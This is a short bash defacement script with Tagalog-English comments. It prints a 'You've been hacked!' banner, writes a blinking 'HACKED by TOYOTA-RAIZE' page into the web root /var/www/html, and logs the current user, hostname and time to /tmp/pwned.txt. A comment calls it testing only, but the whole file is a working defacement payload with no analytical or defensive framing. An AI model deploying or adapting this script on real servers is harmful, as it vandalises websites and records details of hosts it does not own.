#!/bin/bash

#CHECK MUNA NET
ping -c 1 127.0.0.1 > /dev/null && clear

#ISKERI MESSAGE
echo -e "\e[31m"
echo "######################################"
echo "#        You've been hacked!         #"
echo "######################################"
echo -e "\e[0m"

#DEFACE DAPAT PERO TESTING LANG
echo "<!DOCTYPE html><html><head><style>
body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:red;font:3em monospace}
.blink{animation:blink 1s infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
</style></head><body><div class="blink">HACKED by TOYOTA-RAIZE</div></body></html>" > /var/www/html/hacked.html

# Capture basic host info (for simulation)
echo "[+] Host Compromised" > /tmp/pwned.txt
echo "User: $(whoami)" >> /tmp/pwned.txt
echo "Hostname: $(hostname)" >> /tmp/pwned.txt
echo "Time: $(date)" >> /tmp/pwned.txt
echo "Marker page: /var/www/html/hacked.html" >> /tmp/pwned.txt

# Optional: Print to screen
cat /tmp/pwned.txt
